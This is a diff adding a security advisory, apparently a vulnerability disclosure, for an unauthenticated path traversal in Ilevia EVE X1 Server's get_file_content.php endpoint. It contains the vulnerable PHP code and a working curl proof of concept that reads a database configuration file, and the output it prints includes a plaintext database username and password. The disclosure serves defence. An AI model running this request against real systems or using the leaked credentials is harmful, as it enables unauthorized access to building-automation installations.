@@ -1,0 +1,81 @@
+
+Ilevia EVE X1 Server 4.7.18.0.eden Parameter Traversal Arbitrary File Access
+
+
+Vendor: Ilevia Srl.
+Product web page: https://www.ilevia.com
+Affected version: <=4.7.18.0.eden
+
+Summary: EVE is a smart home and building automation solution designed
+for both residential and commercial environments, including malls, hotels,
+restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+control and monitoring of electrical installations through a highly customizable,
+user-friendly interface.
+
+EVE is a multi-protocol platform that integrates various systems within
+a smart building to enhance comfort, security, safety, and energy efficiency.
+Users can manage building functions via iPhone, iPad, Android devices, Windows
+PCs, or Mac computers.
+
+The EVE X1 Server is the dedicated hardware solution for advanced building
+automation needs. Compact and powerful, it is ideal for apartments, small
+to medium-sized homes, and smaller commercial installations. It is designed
+to manage entire automation systems reliably and efficiently.
+
+Desc: An unauthenticated absolute and relative path traversal vulnerability exists
+in the smart home/building automation platform via the /ajax/php/get_file_content.php
+endpoint. By supplying a crafted 'file' POST parameter, a remote attacker can
+read arbitrary files from the server's file system, resulting in sensitive
+information disclosure.
+
+-----------------------------------------------------------------------------
+/ajax/php/get_file_content.php:
+-------------------------------
+01: <?php
+02:     if(isset($_POST["file"]) === FALSE) {
+03:         echo "No file specified!";
+04:         exit(1);
+05:     }
+06:
+07:     $file = $_POST["file"];
+08:     if(file_exists($file)){
+09:         die(file_get_contents($file));
+10:     }
+11: ?>
+-----------------------------------------------------------------------------
+
+Tested on: GNU/Linux 5.4.35 (armv7l)
+           GNU/Linux 4.19.97 (armv7l)
+           Armbian 20.02.1 Buster
+           Apache/2.4.38 (Debian)
+           PHP Version 7.3.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5960
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5960.php
+CVE ID: CVE-2025-34517
+        CVE-2025-34518
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2025-34517
+         https://www.cve.org/CVERecord?id=CVE-2025-34518
+
+
+01.05.2024
+
+--
+
+
+$ curl "http://ilevia:8080/ajax/php/get_file_content.php" \
+> -d "file=/home/ilevia/www-config/http/ajax/php/db_eve.php"
+<?php
+
+$strConnection = "localhost:/ilevia/eve/bin/data/db/bh.data";
+$strUser = "ileviasystems";
+$strPass = "ilevia919firebird";
+$strCharSet = "UTF8";
+$strRoule = "3";
+...
+...
